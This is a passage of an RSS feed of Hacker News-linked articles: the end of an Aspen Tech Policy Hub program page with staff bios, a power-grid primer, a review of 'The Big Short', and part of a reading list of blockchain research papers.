<blockquote><p><em><em><em>As it turns out, optimizing government for human beings is a radical idea. Learning from experts and civil servants dedicated to this idea was eye-opening. Working with fellow techies to try and contribute some ideas of our own was both humbling and exhilarating. – Ashley Llorens</em></em></em></p></blockquote>




</div>
</div>



<div>
<div>
<figure><img loading="lazy" width="987" height="1024" src="https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Ellipse-4-987x1024.png" alt="" srcset="https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Ellipse-4-987x1024.png 987w, https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Ellipse-4-289x300.png 289w, https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Ellipse-4-768x797.png 768w, https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Ellipse-4-1481x1536.png 1481w, https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Ellipse-4-1974x2048.png 1974w" sizes="(max-width: 987px) 100vw, 987px"></figure>
</div>



<div>
<blockquote><p><em><em><em>I enjoyed meeting and working closely with CTOs, CIOs, CDOs and others on challenging real-world government problems. It was a great opportunity to  leverage the strengths of a broad cross-section of technology executives. &nbsp;– Anirma Gupta</em></em></em></p></blockquote>
</div>
</div>



<div>
<div>
<figure><img loading="lazy" width="1024" height="1024" src="https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Ellipse-3-1024x1024.png" alt="" srcset="https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Ellipse-3-1024x1024.png 1024w, https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Ellipse-3-300x300.png 300w, https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Ellipse-3-150x150.png 150w, https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Ellipse-3-768x768.png 768w, https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Ellipse-3-1536x1536.png 1536w, https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Ellipse-3-2048x2048.png 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
</div>



<div>
<blockquote><p><em><em><em>The TELI program blended industry best practices with a practical overview of federal service exceptionally well.&nbsp;It was a great primer for any tech executive looking to understand government process and shortfalls. – Chuck Borges</em></em></em></p></blockquote>
</div>
</div>



		</div></div></div><div><div><p>

 	


<h2>Our Team</h2>



		
		</p><section>
							<article>
					
											<div>
							<h2>Meha Ahluwalia</h2>
							<h5>Program Coordinator, Aspen Tech Policy Hub</h5>
							<p>Meha Ahluwalia is the Program Coordinator of the Aspen Tech Policy Hub. Previously, she interned at the Brookings Institution’s Center for Technology Innovation, assisted healthcare cybersecurity research…							</p>
							<p>Meha Ahluwalia is the Program Coordinator of the Aspen Tech Policy Hub. Previously, she interned at the Brookings Institution’s Center for Technology Innovation, assisted healthcare cybersecurity research at MIT, and helped develop a new feature for the Edge browser at Microsoft. Meha holds a BA in Cognitive Science from Wellesley College. In her spare time, she enjoys listening to podcasts, taking long drives, and getting lost in museums.</p>
							<p><span>Read Less</span>
								<span>Read More</span>
							</p>
						</div>
						
										
				</article>
							<article>
					
											<div>
							<h2>Jennifer Anastasoff</h2>
							<h5>Executive Director, Tech Talent Project</h5>
							<p>Jennifer Anastasoff is Executive Director of the Tech Talent Project. She was a founding member of U.S. Digital Service at the White House and served as Head…							</p>
							<p>Jennifer Anastasoff is Executive Director of the Tech Talent Project. She was a founding member of U.S. Digital Service at the White House and served as Head of People from 2014 until 2017, increasing the team from three to over 200 and created a diverse, cross-functional pipeline of digital talent from around America into our federal government. She has a Master’s in Public Policy and International Education from Harvard University. Jennifer spends her spare time reading, writing, and attempting to set up online karaoke.</p>
							<p><span>Read Less</span>
								<span>Read More</span>
							</p>
						</div>
						
										
				</article>
							<article>
					
											<div>
							<h2>Dana Chisnell</h2>
							<h5>Partner-Founder, Project Redesign</h5>
							<p>Dana Chisnell is a Senior Fellow at the National Conference on Citizenship and Partner-Founder at Project Redesign. She’s the lead instructor for human-centered government service delivery for…							</p>
							<p>Dana Chisnell is a Senior Fellow at the National Conference on Citizenship and Partner-Founder at Project Redesign. She’s the lead instructor for human-centered government service delivery for the Tech Executive Leadership Initiative. She was co-founder of the Center for Civic Design and a founding member of the United States Digital Service. Ask her about her Field Guides To Ensuring Voter Intent being in the permanent collection of the Smithsonian.</p>
							<p><span>Read Less</span>
								<span>Read More</span>
							</p>
						</div>
						
										
				</article>
							<article>
					
											<div>
							<h2>Betsy Cooper</h2>
							<h5>Executive Director, Aspen Tech Policy Hub</h5>
							<p>Betsy Cooper is founding Executive Director of the Aspen Tech Policy Hub. Previously, she was the founding Executive Director of the UC Berkeley Center for Long-Term Cybersecurity…							</p>
							<p>Betsy Cooper is founding Executive Director of the Aspen Tech Policy Hub. Previously, she was the founding Executive Director of the UC Berkeley Center for Long-Term Cybersecurity and was a policy and legal counselor at the Department of Homeland Security. Betsy has a DPhil from the University of Oxford and graduated from Yale Law School. In her spare time, she likes to run experiments to see if her digital devices are listening to her.</p>
							<p><span>Read Less</span>
								<span>Read More</span>
							</p>
						</div>
						
										
				</article>
							<article>
					
											<div>
							<h2>Ginny Hunt</h2>
							<h5>Partner-Founder, Project Redesign</h5>
							<p>Ginny Hunt is a Senior Fellow at the National Conference on Citizenship and Partner-Founder at Project Redesign. She was the founding head of Justice &amp; Opportunity at…							</p>
							<p>Ginny Hunt is a Senior Fellow at the National Conference on Citizenship and Partner-Founder at Project Redesign. She was the founding head of Justice &amp; Opportunity at the Chan Zuckerberg Initiative, a founding director of the US Digital Service, and founding PM of Google’s Public Sector team. Ask her about Tennessee walking horses.</p>
							<p><span>Read Less</span>
								<span>Read More</span>
							</p>
						</div>
						
										
				</article>
							<article>
					
											<div>
							<h2>Madeline Libbey</h2>
							<h5>Program Assistant, Aspen Tech Policy Hub</h5>
							<p>Madeline Libbey is a Program Assistant with the Aspen Tech Policy Hub. She is a recent graduate from Stanford University where she studied Political Science, Computer Science,…							</p>
							<p>Madeline Libbey is a Program Assistant with the Aspen Tech Policy Hub. She is a recent graduate from Stanford University where she studied Political Science, Computer Science, and Ethics in Society, and contributed research to the Stanford Global Digital Policy Incubator. Madeline currently attends the Oxford Internet Institute where she studies Social Science of the Internet. When she is not researching tech policy, Madeline can be found biking, hiking, and running around her home town of Sonoma Valley.</p>
							<p><span>Read Less</span>
								<span>Read More</span>
							</p>
						</div>
						
										
				</article>
							<article>
					
											<div>
							<h2>Cassandra Madison</h2>
							<h5>Acting Executive Director, Tech Talent Project</h5>
							<p>Cassandra Madison is Director of Partnerships at the Tech Talent Project, and is an experienced public servant whose expertise sits at the intersection of technology, operations, and…							</p>
							<p>Cassandra Madison is Director of Partnerships at the Tech Talent Project, and is an experienced public servant whose expertise sits at the intersection of technology, operations, and policy. She has spent the past 15 years helping to ensure that big ideas get implemented in a way that drives innovation, improves the lives of those accessing services, and builds a positive culture in the workplace.</p>
							<p><span>Read Less</span>
								<span>Read More</span>
							</p>
						</div>
						
										
				</article>
							<article>
					
											<div>
							<h2>Hayley Pontia</h2>
							<h5>Program Assistant, TELI Human-Centered Government Service Design Course</h5>
							<p>Hayley Pontia is a Student Analyst at the Beeck Center for Social Impact + Innovation. Previously, Hayley served as the Communications Intern for the Education Policy Program…							</p>
							<p>Hayley Pontia is a Student Analyst at the Beeck Center for Social Impact + Innovation. Previously, Hayley served as the Communications Intern for the Education Policy Program at New America. Hayley has a BA and BS from the University of Pittsburgh in Communications and Psychology, and an MA from Georgetown University in Communication, Culture, and Technology. On the weekends Hayley enjoys long walks with her dog, antiquing, and spending time taking care of her plants.</p>
							<p><span>Read Less</span>
								<span>Read More</span>
							</p>
						</div>
						
										
				</article>
							<article>
					
											<div>
							<h2>Mai Sistla</h2>
							<h5>Deputy Director, Aspen Tech Policy Hub</h5>
							<p>Mai Sistla is the Deputy Director of the Aspen Tech Policy Hub. Previously, she was a project manager at the University of Chicago Crime Lab—a policy research…							</p>
							<p>Mai Sistla is the Deputy Director of the Aspen Tech Policy Hub. Previously, she was a project manager at the University of Chicago Crime Lab—a policy research center that generates evidence to inform crime, criminal justice, and education policy—and a field staffer at the Centers for Disease Control and Prevention. Mai holds a BA in economics from Northwestern University and an MPP from UC Berkeley’s Goldman School of Public …</p></div></article></section></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.aspentechpolicyhub.org/teli/">https://www.aspentechpolicyhub.org/teli/</a></em></p>]]>
            </description>
            <link>https://www.aspentechpolicyhub.org/teli/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24956890</guid>
            <pubDate>Sun, 01 Nov 2020 02:53:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Energy Basics and the Power Grid – Yes Energy's Power Markets 101]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24956791">thread link</a>) | @mooreds
<br/>
October 31, 2020 | https://www.yesenergy.com/yeblog/energy-basics-power-grid-yes-energy-101 | <a href="https://web.archive.org/web/*/https://www.yesenergy.com/yeblog/energy-basics-power-grid-yes-energy-101">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-991a454ca6a5f1084af6"><p><h2><strong>Welcome to Yes Energy’s Power Markets 101! </strong></h2><h3><strong>Learning Objectives:</strong></h3></p></div><div data-block-type="2" id="block-yui_3_17_2_1_1601404519286_31799"><div><p><strong>Readers will understand: </strong></p><ul data-rte-list="default"><li><p><strong>The configuration of the power grid</strong></p></li><li><p><strong>Electric generation types </strong></p></li><li><p><strong>The use of transmission lines to distribute to end users</strong></p></li></ul><p>In order to “get” power markets, you have to have an understanding of the power grid, so let’s begin!</p><h3>Electric Supply and Demand </h3><p>Energy and power markets are significantly different than other commodity markets for one key reason.  As of now, there is no viable way to store large or wholesale amounts of electricity for later use.  The utilization of battery storage for energy is cost prohibitive.  As a result, <strong>the demand for electricity must be met exactly by the supply in real time.  </strong>We’ll explain how power markets balance supply and demand in a later post, but for now keep in mind that supply and demand must be balanced.  </p><h3>Generation  </h3><p>So how is electricity produced, and how does it reach the end consumer?&nbsp; Electricity is produced by generators, the suppliers of electricity.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1600192343421_162364"><p>Generators must do work in order to produce electricity, and excluding solar farms, all plants use turbines that drive electromagnetic generators to produce electricity.&nbsp; (We won’t go into detail about generators here, but look out for our post on all things generation.)</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1601412188771_141807"><div><p>While transmission lines are good conductors, some loss still occurs when electricity is moved through the lines.&nbsp; To reduce this loss, electricity is moved at high voltages on these transmission lines.&nbsp;&nbsp;</p><h3>Transformers, Transmission and Distribution</h3><p>Once the electricity is produced at a generator, it must be transformed to this higher voltage, which happens at a step up transformer.&nbsp; Step up transformers utilize alternating currents to increase voltage.&nbsp;&nbsp;</p><p>The electricity is then moved onto high-voltage transmission lines, capable of carrying electricity over long distances.&nbsp; Once the electricity has been moved closer to the end user, the voltage needs to be transformed to a lower voltage for safer distribution. This happens at a step down transformer.&nbsp; Now the electricity is ready for delivery to a distribution substation.&nbsp; </p><p>From the distribution substation, electricity is carried on distribution lines, which are the equivalent of residential roads in the highway analogy.&nbsp; From the distribution lines, electricity is stepped down one last time at a residential step down transformer before being used in homes and businesses.&nbsp;&nbsp;</p></div></div></div>]]>
            </description>
            <link>https://www.yesenergy.com/yeblog/energy-basics-power-grid-yes-energy-101</link>
            <guid isPermaLink="false">hacker-news-small-sites-24956791</guid>
            <pubDate>Sun, 01 Nov 2020 02:23:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bonds, Bubbles, Bust, & Michael Burry in “The Big Short” – EBrand Me]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24956675">thread link</a>) | @LawrenceJ82
<br/>
October 31, 2020 | https://ebrandme.biz/2020/03/05/bonds-bubbles-bust-michael-burry-in-the-big-short/ | <a href="https://web.archive.org/web/*/https://ebrandme.biz/2020/03/05/bonds-bubbles-bust-michael-burry-in-the-big-short/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p>Back in January, I introduced what is to become a monthly series which would feature contents surrounding cinema. The first of which was <a href="https://ebrandme.biz/2020/01/31/ray-harryhausen-monsters-myths-lore/"><em>“Ray Harryhausen: Monsters, Myths &amp; Lore.”</em></a> February came, languished for 29 days this time around, but I didn’t manage to share a follow-up.</p>
<p>On this note, we’ll begin March with one of my favorite movies, <a href="https://amzn.to/3csQPTc" target="_blank" rel="noopener"><em>The Big Short</em></a>, based on the true story surrounding the housing market crash from the viewpoints of Mark Baum, Charlie Geller, Jamie Shipley, and Michael Burry (then head of Scion Capital).</p>
<p>The movie starts with a favorite quote of mine, which is attributed to Mark Twain:</p>
<blockquote><p>It ain’t what you don’t know that gets you in trouble. It’s what you know for sure just ain’t so.</p></blockquote>
<p>Based on the true story of events leading up to the 2008 market crash, we’re first presented with Lewis Ranierie and how he “changed the banking industry” with the introduction of&nbsp; mortgage-backed securities (MBS), under the impression that they were a safe investment with high yield because, “who doesn’t pay their mortgage?”&nbsp; “Who, who,” said the owl.</p>
<p>Proudly, he thinks this is a AAA rated bond. Signed. Sealed. Delivered. Bankers were enjoying their lush paychecks, and at least in the movie, scantily clad ladies.</p>
<p>In comes Michael Burry, who smells that something’s afoot in 2005, and begins to look at the state of the mortgages contained in the 20 top selling mortgage bonds.&nbsp; With his findings, he decides to approach several banks and short them to the sum of $1.3 billion through the purchase of credit default swaps.</p>
<p>Next we’re introduced to Mark Baum, whose firm FrontPoint Partners gets a tip-off from a wrong number. They meet with Jared Venett (nicknamed Chicken Little &amp; Bubble Boy) who proceeds to tell them that the worst mortgage bonds are then repackaged as a collatorized debt obligations (CDO) and rated AAA by the rating agencies.&nbsp; Fast forward and FrontPoint shorts to the amount of $50 million in Garibaldi IV, BBB swaps. Then another $500 million following a meeting with a CDO manager at the American Securitization Forum in Vegas, who Mark Baum tells “I didn’t realize there was anything to manage with CDOs.” Here we learn that not only are there CDOs, but synthetic ones as well. The plot thickens without flour or cornstarch.</p>
<p>We meet Charlie Geller and Jamie Shipley of Brownfield Fund in the lobby of JPMorgan Chase for a 4:50PM meeting (bank closes at 5PM), seeking an ISDA agreement not knowing that the capital requirement was $1.5 billion. At the time, their fund was worth a respectable $30 million having started with $110,000. They later find out about the housing bubble prediction through a friend of Charlie Geller’s and with funding from Ben Rickert, a suspicious retired banker who felt the NSA had too much authority, also bet against the housing market.</p>
<p>Then 2008 happened and “boom” goes the dynamite. Except that it wasn’t funny considering the impact.</p>
<p>One of the most humanizing parts in the movie was when Charlie Geller and Jamie Shipley were celebrating shorting some AA tranches of CDOs, and Ben Rickert (Brad Pitt) said: “Do you gave any idea what you just did? You just bet against the American economy. Which means, if we’re right, people lose homes. People lose jobs. People lose retirement savings. People lose pensions. […] Every 1% unemployment goes up, 40,000 people die.”</p>
<p>The movie ends with Michael Burry sending an e-mail to investors as he prepares to close down the hedge fund:</p>
<blockquote><p>[…] People want an authority to tell them how to value things, but they choose this authority not based on facts or results. They choose it because it seems authoritative and familiar… and I am not, and never have been familiar. So I’ve come to the sullen realization that I must close down the fund.</p>
<p>Sincerely,<br>
Michael J. Burry, M.D.</p></blockquote>
<p>It’s said that the investing Michael Burry continues to do is focused on water. Water which should be a basic human right… so is clean air, but you actually purchase cans of it.</p>
					</div><div>
				<p><span><img alt="" src="https://0.gravatar.com/avatar/3b17d38064792d1e21defd0e40149341?s=48&amp;d=identicon&amp;r=G" height="48" width="48"></span>		</p><!-- .author-avatar -->
		
		<!-- .author-heading -->

		<p>
			Multifaceted marketing professional with a demonstrated history of working in the publishing, arts, and financial services industries. eBrand Me focuses on creating long-term value by focusing on authentic social experiences. Author of "Drunken Philosophy" and "Poop! Random Words, Musings and Insight."			<a href="https://ebrandme.biz/author/ebrandmeseo/" rel="author">
				View all posts by Lawrence Jean-Louis			</a>
		</p><!-- .author-bio -->
	</div></div>]]>
            </description>
            <link>https://ebrandme.biz/2020/03/05/bonds-bubbles-bust-michael-burry-in-the-big-short/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24956675</guid>
            <pubDate>Sun, 01 Nov 2020 01:48:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Science of Blockchains]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24956642">thread link</a>) | @emrehan
<br/>
October 31, 2020 | https://hantuzun.com/posts/the-science-of-blockchains/ | <a href="https://web.archive.org/web/*/https://hantuzun.com/posts/the-science-of-blockchains/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><p>⁠<time>October 31, 2020</time></p><p><img src="https://hantuzun.com/static/cover.b5a07491de.jpg" alt="Cover"></p><p>I’m starting my blog with a blog series to celebrate the 12th anniversary of the Bitcoin white paper. 🎂</p><p>I’ll introduce an extensive technical foundation to comprehend Bitcoin, Ethereum, and the future of blockchains.</p><p>The series is based on selected fundamental papers.</p><hr><h2 id="why-i-start-this-series">Why I Start This Series?</h2><p>I like to have a comprehension of the primary sources when learning about a subject.</p><p>When I’ve been teaching at <a href="https://twitter.com/blockchainokulu" target="_blank" rel="noreferrer noopener">@BlockchainOkulu</a>
, I structured my lessons around primary sources such as the Bitcoin white paper and the Ethereum yellow paper.</p><p>This way, my students learned not only what I know, but also what’s the source of the knowledge. Now that they’re graduated, they know where to look for when they have questions.</p><p>Even though the course was four weeks long for each batch I could not answer some excellent questions in detail. Instead, I had to resort to black boxes.</p><p>How do digital signatures work? A black box.</p><p>What about ZK-STARKs? Another black box.</p><p>Black boxes help to teach a subject. Not so much for understanding in detail.</p><p>To understand Bitcoin, Ethereum, and more on a deeper level, one should know the pillars they are built on.</p><p>You understand the strength of the Bitcoin network when you know how does SHA-256 work.</p><p>You understand how your contracts run once you know the inner-working of the EVM.</p><p>You understand the security of the protocols you invest in when you, well, know a lot.</p><p>Thus, as you understand these subjects, you will realize how important blockchain really is. You will probably want to contribute to these exciting projects.</p><p>The more you will know, the more you will be able to participate in the governance of blockchains.</p><p>What should be the block size?</p><p>What’re your opinions on various layer 2 protocols?</p><p>How can you help us approaching the open questions on scalability?</p><p>All you need to do is to join the conversations, as long as you know about the subject in depth.</p><p>I recently realized that the most technical issues are getting the least participation.</p><p>Then, I decided to create this blog series with the goal of having new voices on the future of blockchain governances.</p><p>New voices that understand the contemporary issues very well.</p><p>This is one of the best things I can do for crypto.</p><blockquote data-dnt="true"><p lang="en" dir="ltr">One bull market to learn the lesson. Second bull market to make retirement money. Third bull market to ask not what crypto can do for you but what you can do for crypto.</p>— Qiao Wang (@QwQiao) <a href="https://twitter.com/QwQiao/status/1299500501604667396?ref_src=twsrc%5Etfw">August 29, 2020</a></blockquote><h2 id="intended-audience">Intended Audience</h2><p>The series will demand the reader to be comfortable with computer science papers. In fact, the content will be the papers.</p><p>My job is to curate the papers, explain their contexts in the blockchain space, and clarify them with my reading notes.</p><p>Ultimately, the series will offer a fundamental understanding of blockchain technologies to eager readers, be it economics students or CS professors.</p><h2 id="the-papers">The Papers</h2><p>I’m proud to present you 67 primary sources on the science of blockchains. Wish me plenty of free time for covering some of them in this blog series!</p><h3 id="cryptography">Cryptography</h3><p><strong>Fundementals</strong></p><ul><li><p>Bloom, B. 1970. Space/Time Trade-offs in Hash Coding with Allowable Errors. <a href="http://crystal.uta.edu/~mcguigan/cse6350/papers/Bloom.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Rivest R. L., Shamir A., Adleman L. 1978. A Method for Obtaining Digital Signatures and Public-Key Cryptosystems. <a href="https://people.csail.mit.edu/rivest/Rsapaper.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Merkle, R. C. 1980. Protocols for public key cryptosystems. IEEE Symposium on Security and Privacy. <a href="http://www.merkle.com/papers/Protocols.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Penard W., van Werkhoven, T. 2001. On the Secure Hash Algorithm family. <a href="https://web.archive.org/web/20160330153520/http://www.staff.science.uu.nl/~werkh108/docs/study/Y5_07_08/infocry/project/Cryp08.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li></ul><p><strong>Elliptic-curve Cryptography</strong></p><ul><li><p>Koblitz, N. 1987. Elliptic curve cryptosystems. <a href="https://www.ams.org/journals/mcom/1987-48-177/S0025-5718-1987-0866109-5/S0025-5718-1987-0866109-5.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Miller, V. 1985. Use of elliptic curves in cryptography. <a href="https://link.springer.com/content/pdf/10.1007%2F3-540-39799-X_31.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Boneh, D., Lynn, B., Shacham, H. 2004. Short signatures from the Weil pairing. <a href="https://www.iacr.org/archive/asiacrypt2001/22480516.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>ANSI. 2005. Public Key Cryptography for the Financial Services Industry: The Elliptic Curve Digital Signature Algorithm (ECDSA). <a href="https://webstore.ansi.org/Standards/ASCX9/ANSIX91422020" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Bernstein D. J. 2006. Curve25519: new Diffie-Hellman speed records. <a href="https://cr.yp.to/ecdh/curve25519-20060209.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Brown D. R. L. 2010. SEC 2: Recommended Elliptic Curve Domain Parameters. <a href="https://www.secg.org/sec2-v2.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Kate, A. et al. 2010. Constant-Size Commitments to Polynomials and Their Applications. <a href="https://www.iacr.org/archive/asiacrypt2010/6477178/6477178.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Wang D. 2014. Secure Implementation of ECDSA Signatures in Bitcoin. <a href="http://www.nicolascourtois.com/bitcoin/thesis_Di_Wang.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Schnorr, C. 1990. Efficient identification and signatures for smart cards. <a href="https://link.springer.com/chapter/10.1007/0-387-34805-0_22" target="_blank" rel="noreferrer noopener">📃</a></p></li></ul><p><strong>Quantum Cryptography</strong></p><ul><li><p>Shor, P. W. 1996. Polynomial-Time Algorithms for Prime Factorization and Discrete Logarithms on a Quantum Computer. <a href="https://arxiv.org/pdf/quant-ph/9508027.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Aggarwal, D. et al. 2017. Quantum attacks on Bitcoin, and how to protect against them. <a href="https://arxiv.org/pdf/1710.10377.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li></ul><p><strong>Zero Knowledge</strong></p><ul><li><p>Goldreich O. 1991. Proofs that Yield Nothing But Their Validity All Languages in NP Have Zero-Knowledge Proof Systems. <a href="https://people.csail.mit.edu/silvio/Selected%20Scientific%20Papers/Zero%20Knowledge/Proofs_That_Yield_Nothing_But_Their_Validity_or_All_Languages_in_NP_Have_Zero-Knowledge_Proof_Systems.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Reitwiessner, C. 2016. zkSNARKs in a Nutshell. <a href="https://chriseth.github.io/notes/articles/zksnarks/zksnarks.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Bunz, B. et al. 2017. Bulletproofs: Short Proofs for Confidential Transactions and More. <a href="https://eprint.iacr.org/2017/1066.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Ben-Sasson, E. et al. 2018. Scalable, transparent, and post-quantum secure computational integrity. <a href="https://eprint.iacr.org/2018/046.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Gabizon, A. et al. 2020. PLONK: Permutations over Lagrange-bases for Oecumenical Noninteractive arguments of Knowledge. <a href="https://eprint.iacr.org/2019/953.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li></ul><h3 id="distributed-computing-and-consensus">Distributed Computing and Consensus</h3><ul><li><p>Schneider F. B. 1990. Implementing Fault-Tolerant Services Using the State Machine Approach: A Tutorial. <a href="https://nakamotoinstitute.org/static/docs/implementing-fault-tolerant-services.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Lamport, L., et al. 1982. The Byzantine Generals Problem. ACM Transactions on Programming Languages and Systems 4(3): 382-401. <a href="https://dl.acm.org/citation.cfm?id=357176" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Castro, M., Liskov, B. 1999. Practical Byzantine fault tolerance. Proceedings of the Third Symposium on Operating Systems Design and Implementation. <a href="http://pmg.csail.mit.edu/papers/osdi99.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Lamport, L. 2001. Paxos made simple. <a href="http://lamport.azurewebsites.net/pubs/paxos-simple.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Szabo, N. 2003. Advances in Distributed Security. <a href="https://nakamotoinstitute.org/advances-in-distributed-security/" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Aspnes, J., et al. 2005. Exposing computationally challenged Byzantine imposters. Yale University Department of Computer Science. <a href="http://cs.yale.edu/publications/techreports/tr1332.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Stutzbach, D., Rejaie, R. 2006. Understanding Churn in Peer-to-Peer Networks; <a href="http://www.barsoom.org/papers/imc-2006-churn.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Berman, P., Juan A. 1993. Cloture Votes: n/4-resilient Distributed Consensus in t + 1 rounds. <a href="https://link.springer.com/article/10.1007%2FBF01187072" target="_blank" rel="noreferrer noopener">📃</a></p></li></ul><h3 id="timestamping">Timestamping</h3><ul><li><p>Haber, S., Stornetta, W. S. 1997. Secure names for bit-strings. <a href="http://dl.acm.org/citation.cfm?id=266430" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Massias, H., Avila X. S., Quisquater, J.-J. 1999. Design of a secure timestamping service with minimal trust requirements. <a href="https://nakamotoinstitute.org/static/docs/secure-timestamping-service.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Just, M. 1998. Some timestamping protocol failures. <a href="https://www.ndss-symposium.org/wp-content/uploads/2017/09/Some-Timestamping-Protocol-Failures_0.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Bonnecaze, A. et al. 2002. Improving Time Stamping Schemes: A Distributed Point of View. <a href="http://pages.upf.pf/Alban.Gabillon/articles/AnnalTelecom.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li></ul><h3 id="digital-money">Digital Money</h3><ul><li><p>Chaum, D., et al. 1988. Untraceable electronic cash. Advances in Cryptology: 319-327. <a href="https://dl.acm.org/citation.cfm?id=88969" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Dai, W. 1998. <a href="http://www.weidai.com/bmoney.txt" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Szabo, N. 2008. Bit gold. <a href="https://unenumerated.blogspot.com/2005/12/bit-gold.html" target="_blank" rel="noreferrer noopener">📃</a></p></li></ul><h3 id="proof-of-work">Proof of Work</h3><ul><li><p>Back, A. 2002. Hashcash—a denial of service counter measure. <a href="http://www.hashcash.org/papers/hashcash.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Douceur, J. R. 2002. The Sybil attack. <a href="https://dl.acm.org/citation.cfm?id=687813" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Szabo, N. 1999. Intrapolynomial Cryptography. <a href="https://nakamotoinstitute.org/intrapolynomial-cryptography/" target="_blank" rel="noreferrer noopener">📃</a></p></li></ul><h3 id="bitcoin">Bitcoin</h3><ul><li><p>Nakamoto, S. 2008. Bitcoin: a peer-to-peer electronic cash system. <a href="https://bitcoin.org/bitcoin.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Wuille, P. 2012. BIP 32: Hierarchical Deterministic Wallets. <a href="https://en.bitcoin.it/wiki/BIP_0032" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Rosenfeld M. 2012. Overview of Colored Coins. <a href="https://bitcoil.co.il/BitcoinX.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Biryukov, A. et al. 2014 Deanonymisation of clients in Bitcoin P2P network. <a href="https://arxiv.org/pdf/1405.7418.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Poon, J., Dryja, T. 2016. The Bitcoin Lightning Network: Scalable Off-Chain Instant Payments. <a href="https://lightning.network/lightning-network-paper.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Pass, R., et al. 2017. Analysis of the blockchain protocol in asynchronous networks. <a href="https://link.springer.com/chapter/10.1007/978-3-319-56614-6_22" target="_blank" rel="noreferrer noopener">📃</a></p></li></ul><h3 id="smart-contracts">Smart Contracts</h3><ul><li><p>Turing, A. M. 1937. On Computable Numbers, with an Application to the Entscheidungsproblem. <a href="https://londmathsoc.onlinelibrary.wiley.com/doi/abs/10.1112/plms/s2-42.1.230" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Szabo, N. 1994. Smart contracts. <a href="http://www.fon.hum.uva.nl/rob/Courses/InformationInSpeech/CDROM/Literature/LOTwinterschool2006/szabo.best.vwh.net/smart.contracts.html" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Bhargavan, K. et al. 2016. Short Paper: Formal Verification of Smart Contracts. <a href="https://www.cs.umd.edu/~aseem/solidetherplas.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li></ul><h3 id="proof-of-stake">Proof of Stake</h3><ul><li><p>Poelstra, A. 2015. On Stake and Consensus. <a href="https://download.wpsoftware.net/bitcoin/pos.pdf" target="_blank" rel="noreferrer 